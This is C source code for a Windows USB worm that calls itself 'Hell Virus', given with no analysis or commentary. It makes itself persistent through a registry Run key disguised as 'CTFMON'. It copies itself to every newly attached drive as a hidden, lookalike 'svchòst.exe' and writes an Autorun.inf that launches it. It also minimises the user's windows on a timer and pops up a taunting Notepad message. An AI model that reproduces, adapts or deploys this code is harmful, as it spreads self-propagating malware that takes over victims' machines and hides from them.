

#include<afxwin.h>
#include<afxmt.h>
#include<SHLWAPI.h>
#include<MSDETECT.h>

int nDrives;
char drlist[26][5];
CCriticalSection cs;

int SetRegistry(char *filepath)
{
	HKEY reg;	
	if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE | KEY_ALL_ACCESS, &reg) != ERROR_SUCCESS)
	{
		return 0;
	}
	if(RegSetValueEx(reg,"CTFMON", 0, REG_SZ, (const BYTE*)filepath, strlen(filepath)) != ERROR_SUCCESS)
	{	
		return 0;
	}
	RegCloseKey(reg);
	return 1;	
}

int RefreshDriveLists()
{
	int i;
	char drive[5] = "c:\\";	

	i = nDrives = 0;
	while(i < 26)
	{
		if(PathFileExists(drive))
		{	
			//MessageBox(NULL, drive, "Drive Exists", MB_OK);
			strcpy(drlist[nDrives], drive);
			nDrives++;
		}
		i++;
		drive[0]++; //get ready for next drive
	}	
	return nDrives;
}

UINT RefreshThread(LPVOID p)
{
	while(1)
	{
		//MessageBox(NULL, "Refreshing drives", "Listening...", MB_OK);
		Sleep(10000);
		cs.Lock();
		RefreshDriveLists();
		cs.Unlock();
	}
	return 0;
}

int SearchInDriveList(char *drive)
{
	int i;
	for(i = 0; i<nDrives; i++)
	{
		if(strcmp(drlist[i], drive) == 0)
		{
			return 1;
		}
	}
	return 0;

}

int DriveAdded(char *newdrive)
{
	int i;
	char drive[5] = "c:\\";

	i = 0;
	while(i < 26)
	{
		if(PathFileExists(drive))
		{	
			if(SearchInDriveList(drive) == 0)
			{
				//new drive added..
				strcpy(newdrive, drive);
				return 1;
			}
		}
		i++;
		drive[0]++; //get ready for next drive
	}
	//No drives added
	return 0;
}
void CopyToNewDrive(char *newdrive)
{
	FILE *fp;
	char temp[20];
	DWORD fileattr;

	strcpy(temp, newdrive);
	strcat(temp, "svchòst.exe");

	//MessageBox(NULL, "Copying...", "", MB_OK);
	
	if(CopyFile(__argv[0], temp, false)) 
	{		
		fileattr = GetFileAttributes(temp);
		fileattr = fileattr | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY;
		SetFileAttributes(temp, fileattr);
	}
	else
		return;	

	//create autorun.inf file...
	
	strcpy(temp, newdrive);
	strcat(temp, "Autorun.inf");

	fp = fopen(temp, "w");
	if(fp == NULL)
		return;

	fprintf(fp, "[autorun]\nopen=svchòst.exe\nshell\\Open=&Open\nshell\\Open\\Command=svchòst.exe\nshell\\Explore=&Explore\nshell\\Explore\\Command=svchòst.exe");
	fclose(fp);

	fileattr = GetFileAttributes(temp);
	fileattr = fileattr | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY;
	SetFileAttributes(temp, fileattr);

	//hide files
}

char message[] = "\r\n\r\n!!!..............YOUR SYSTEM IS VIRUSED..............!!!\r\n\r\nPlease Update your System With the Latest Antiviruses...\r\n\r\nBut I think even that would not help you out... Ha Ha Ha...\r\n\r\n\r\n - Proprietor,\r\n   Hell Virus.";

//Symbols : òóôõöcccc 

UINT VirusProc(LPVOID p)
{
	HWND hwnd, parent, child;
	Sleep(600000);//10 minutes

	while(1)
	{
		child = NULL;
		while(1)
		{
			hwnd = FindWindowEx(NULL, child, NULL, NULL);
			if(hwnd == NULL)
				break;
			ShowWindow(hwnd, SW_MINIMIZE);
			child = hwnd;
		}
		if(FindWindow("Notepad", NULL) == NULL)
		{
			ShellExecute(NULL, "open", "notepad.exe", NULL, NULL, SW_NORMAL);				
		}

		Sleep(200);
		parent = FindWindow("Notepad", NULL);
		if(parent == NULL)
			continue;

		child = FindWindowEx(parent, NULL, "Edit", NULL);
		SetWindowText(parent, ".............LONG    LIVE   VIRUSES..............");
		SendMessage((HWND)child, (UINT) WM_SETTEXT, NULL, (LPARAM)message);		
		Sleep(600000);//10 minutes
	}
	return 0;
}

int WINAPI WinMain(HINSTANCE h,HINSTANCE hp, LPSTR cmd, int cmdshow)
{
	char str[MAX_PATH], name[100], ext[10];
	char newdrive[5];

	GetWindowsDirectory(str, MAX_PATH);

	_splitpath(__argv[0], NULL, NULL, name, ext);
	strcat(str, "\\");
	strcat(str, name);
	strcat(str, ext); //str contains filename in Windows Dir.

	if(stricmp(str, __argv[0])) //if not running from the sytem directory
	{
		//copy to Windows dir
		CopyFile(__argv[0], str, false);

		//run at startup		
		SetRegistry(str);
		strncpy(name, __argv[0], 3);
		name[3] = '\0';		
		ShellExecute(NULL, "open", "explorer", name, NULL, SW_NORMAL);		
		return 0;
	}
	
	//MessageBox(NULL, "Now running from system directory", "svchòst", MB_OK);
	
	RefreshDriveLists();	

	//Thread to refresh drives list periodically.

	AfxBeginThread(VirusProc, NULL);
	AfxBeginThread(RefreshThread, drlist);
	

	//MessageBox(NULL, "Waiting for new Drives...", "Waiting...", MB_OK);

	while(1)
	{
		Sleep(1000);
		cs.Lock();
		if(DriveAdded(newdrive))
		{
			//MessageBox(NULL, newdrive, "New Drive Added.", MB_OK);			
			CopyToNewDrive(newdrive);
			RefreshDriveLists();
			//Now copy file, create autorun.inf, make the files hidden
		}
		cs.Unlock();		
	}		
	return 0;
}

